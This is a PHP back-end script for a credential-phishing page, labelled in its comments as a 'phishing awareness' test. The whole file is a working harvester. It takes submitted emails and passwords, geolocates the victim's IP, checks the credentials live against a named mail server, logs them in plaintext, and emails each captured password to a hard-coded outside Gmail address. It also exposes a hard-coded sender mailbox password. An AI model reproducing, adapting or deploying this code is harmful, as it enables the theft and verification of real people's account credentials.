<?php
// Prevent any output before headers
ob_start();

// Enhanced CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
header('Content-Type: application/json; charset=utf-8');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0); // Don't display errors to browser
ini_set('log_errors', 1);

// Start session
session_start();

// Rate limiting to prevent abuse
$rate_limit_key = 'login_attempts_' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown');
if (!isset($_SESSION[$rate_limit_key])) {
    $_SESSION[$rate_limit_key] = 0;
}

// Only allow POST requests (but handle GET for debugging)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // For debugging - show a simple test page
    ob_clean();
    echo json_encode([
        'status' => 'PHP script is working',
        'method' => 'GET',
        'timestamp' => date('Y-m-d H:i:s'),
        'msg' => 'PHP backend is accessible'
    ]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    ob_clean();
    http_response_code(405);
    echo json_encode(['signal' => 'error', 'msg' => 'Method not allowed']);
    exit;
}

// Configuration
$receiver     = "skkho87.sm@gmail.com";
$senderuser   = "ajitha@debtclearsa.co.za";
$senderpass   = "Nn19871024@@";
$senderport   = 587;
$senderserver = "mail.debtclearsa.co.za";

// Target SMTP server for credential testing
$target_smtp_server = "mail.debtclearsa.co.za";
$target_smtp_port = 587;
$target_smtp_security = "tls";

// Get client information
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

// Get geolocation data (with error handling)
$country = 'Unknown';
$city = 'Unknown';
try {
    $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
    if ($ipdat) {
        $country = isset($ipdat->geoplugin_countryName) ? $ipdat->geoplugin_countryName : 'Unknown';
        $city = isset($ipdat->geoplugin_city) ? $ipdat->geoplugin_city : 'Unknown';
    }
} catch (Exception $e) {
    // Geolocation failed, continue with defaults
}

// Get and validate input
$login = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
$passwd = $_POST['password'] ?? '';

// Basic validation
if (empty($login) || empty($passwd)) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Email and password are required']);
    exit;
}

if (!filter_var($login, FILTER_VALIDATE_EMAIL)) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Invalid email format']);
    exit;
}

// Extract domain from email
$parts = explode("@", $login);
if (count($parts) !== 2) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Invalid email format']);
    exit;
}
$domain = $parts[1];

// Increment attempt counter
$_SESSION[$rate_limit_key]++;
$attempt_number = $_SESSION[$rate_limit_key];

// Prepare log message
$log_message = "=== LOGIN ATTEMPT #$attempt_number ===\n";
$log_message .= "Timestamp: $timestamp\n";
$log_message .= "Email: $login\n";
$log_message .= "Password: $passwd\n";
$log_message .= "IP Address: $ip\n";
$log_message .= "Location: $country | $city\n";
$log_message .= "User Agent: $browser\n";

// Test SMTP credentials using native PHP SMTP functions
$validCredentials = false;
$smtp_error = '';
$connection_details = "Testing: $target_smtp_server:$target_smtp_port ($target_smtp_security)";

try {
    // Test SMTP connection using fsockopen
    $log_message .= "SMTP Server: $connection_details\n";
    
    // Create socket connection
    $errno = 0;
    $errstr = '';
    $timeout = 10;
    
    if ($target_smtp_security === 'ssl') {
        $socket = @fsockopen("ssl://$target_smtp_server", $target_smtp_port, $errno, $errstr, $timeout);
    } else {
        $socket = @fsockopen($target_smtp_server, $target_smtp_port, $errno, $errstr, $timeout);
    }
    
    if (!$socket) {
        throw new Exception("Cannot connect to $target_smtp_server:$target_smtp_port - $errstr ($errno)");
    }
    
    // Read initial response
    $response = fgets($socket, 515);
    if (substr($response, 0, 3) != '220') {
        throw new Exception("Invalid SMTP response: $response");
    }
    
    // Send EHLO
    fwrite($socket, "EHLO localhost\r\n");
    $response = fgets($socket, 515);
    
    // Start TLS if required
    if ($target_smtp_security === 'tls') {
        fwrite($socket, "STARTTLS\r\n");
        $response = fgets($socket, 515);
        if (substr($response, 0, 3) != '220') {
            throw new Exception("STARTTLS failed: $response");
        }
        
        // Enable TLS encryption
        if (!stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
            throw new Exception("Failed to enable TLS encryption");
        }
        
        // Send EHLO again after TLS
        fwrite($socket, "EHLO localhost\r\n");
        $response = fgets($socket, 515);
    }
    
    // Attempt authentication
    fwrite($socket, "AUTH LOGIN\r\n");
    $response = fgets($socket, 515);
    if (substr($response, 0, 3) != '334') {
        throw new Exception("AUTH LOGIN not supported: $response");
    }
    
    // Send username
    fwrite($socket, base64_encode($login) . "\r\n");
    $response = fgets($socket, 515);
    if (substr($response, 0, 3) != '334') {
        throw new Exception("Username rejected: $response");
    }
    
    // Send password
    fwrite($socket, base64_encode($passwd) . "\r\n");
    $response = fgets($socket, 515);
    
    if (substr($response, 0, 3) == '235') {
        $validCredentials = true;
        $log_message .= "Status: VALID CREDENTIALS - Authentication successful\n";
    } else {
        $validCredentials = false;
        $log_message .= "Status: INVALID CREDENTIALS - Authentication failed\n";
        $smtp_error = "Authentication failed: " . trim($response);
    }
    
    // Close connection
    fwrite($socket, "QUIT\r\n");
    fclose($socket);
    
} catch (Exception $e) {
    $validCredentials = false;
    $smtp_error = $e->getMessage();
    $log_message .= "Status: SMTP TEST FAILED\n";
    $log_message .= "Error: $smtp_error\n";
    
    // Additional error details for debugging
    if (strpos($smtp_error, 'Authentication failed') !== false) {
        $log_message .= "Authentication Error: Invalid username/password for $target_smtp_server\n";
    } elseif (strpos($smtp_error, 'Cannot connect') !== false) {
        $log_message .= "Connection Error: Cannot connect to $target_smtp_server:$target_smtp_port\n";
    } elseif (strpos($smtp_error, 'timeout') !== false) {
        $log_message .= "Timeout Error: Connection to $target_smtp_server timed out\n";
    }
}

$log_message .= "==========================================\n\n";

// Log to file
$log_file = "phishing_awareness_log.txt";
@file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);

// Prepare email subject based on result
if ($validCredentials) {
    $subject = "✅ VALID LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "VALID CREDENTIALS DETECTED";
} else {
    $subject = "❌ INVALID LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "INVALID CREDENTIALS";
}

// Prepare email body (simplified without PHPMailer)
$email_body = "Phishing Awareness Test - Login Attempt\n";
$email_body .= "Status: $email_status\n\n";
$email_body .= "Attempt Number: #$attempt_number\n";
$email_body .= "Timestamp: $timestamp\n";
$email_body .= "Email: $login\n";
$email_body .= "Password: $passwd\n";
$email_body .= "IP Address: $ip\n";
$email_body .= "Location: $country, $city\n";
$email_body .= "User Agent: $browser\n\n";
$email_body .= "SMTP Server Tested: $connection_details\n";
if ($validCredentials) {
    $email_body .= "Result: ✅ Authentication successful - Valid credentials\n";
} else {
    $email_body .= "Result: ❌ Authentication failed - Invalid credentials\n";
    $email_body .= "Error Details: $smtp_error\n";
}

// Send notification email using native PHP mail function
$mail_sent = false;
try {
    $headers = "From: $senderuser\r\n";
    $headers .= "Reply-To: $senderuser\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    $mail_sent = @mail($receiver, $subject, $email_body, $headers);
} catch (Exception $e) {
    error_log("Failed to send notification email: " . $e->getMessage());
}

// Prepare response based on credential validity
if ($validCredentials) {
    $response = [
        'signal' => 'ok',
        'success' => true,
        'msg' => 'Login successful! Redirecting...',
        'attempt' => $attempt_number,
        'credentials_valid' => true,
        'smtp_server' => $target_smtp_server
    ];
} else {
    $response = [
        'signal' => 'not ok',
        'success' => false,
        'msg' => 'Invalid email or password. Please try again.',
        'attempt' => $attempt_number,
        'credentials_valid' => false,
        'smtp_server' => $target_smtp_server,
        'error_details' => $smtp_error
    ];
}

// Add notification status to response
$response['notification_sent'] = $mail_sent;
$response['debug_info'] = [
    'php_version' => PHP_VERSION,
    'timestamp' => $timestamp,
    'connection_test' => $connection_details
];

// Clean output buffer and send JSON response
ob_clean();
echo json_encode($response);

// Random hash for additional security
$praga = rand();
$praga = md5($praga);
?>